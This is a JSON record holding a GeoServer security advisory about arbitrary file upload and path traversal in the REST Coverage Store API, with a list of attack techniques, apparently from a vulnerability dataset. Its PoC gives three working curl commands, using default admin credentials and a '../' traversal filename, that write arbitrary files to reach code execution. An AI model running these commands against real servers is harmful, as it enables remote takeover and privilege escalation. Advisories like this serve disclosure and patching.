{"description": "### Summary\nAn arbitrary file upload vulnerability exists that enables an authenticated administrator with permissions to modify coverage stores through the REST Coverage Store API to upload arbitrary file contents to arbitrary file locations which can lead to remote code execution.\n\n### Details\nCoverage stores that are configured using relative paths use a GeoServer Resource implementation that has validation to prevent path traversal but coverage stores that are configured using absolute paths use a different Resource implementation that does not prevent path traversal.\n\n### PoC\nStep 1 (create sample coverage store):\ncurl -vXPUT -H\"Content-type:application/zip\" -u\"admin:geoserver\" --data-binary @polyphemus.zip \"http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic\"\nStep 2 (switch store to absolute URL):\ncurl -vXPUT -H\"Content-Type:application/xml\" -u\"admin:geoserver\" -d\"<coverageStore><url>file:///{absolute path to data directory}/data/sf/filewrite</url></coverageStore>\" \"http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite\"\nStep 3 (upload arbitrary files):\ncurl -vH\"Content-Type:\" -u\"admin:geoserver\" --data-binary @file/to/upload \"http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write\"\nSteps 1 & 2 can be combined into a single POST REST call if local write access to anywhere on the the file system that GeoServer can read is possible (e.g., the /tmp directory).\n\n### Impact\nThis vulnerability can lead to executing arbitrary code.  An administrator with limited privileges could also potentially exploit this to overwrite GeoServer security files and obtain full administrator privileges.\n\n### References\nhttps://osgeo-org.atlassian.net/browse/GEOS-11176\nhttps://github.com/geoserver/geoserver/pull/7222\n", "methods": ["Used arbitrary file upload to upload files to arbitrary locations.", "Used path traversal to upload files to arbitrary locations.", "Executed arbitrary code.", "Obtained elevated privileges.", "Overwrote security files."]}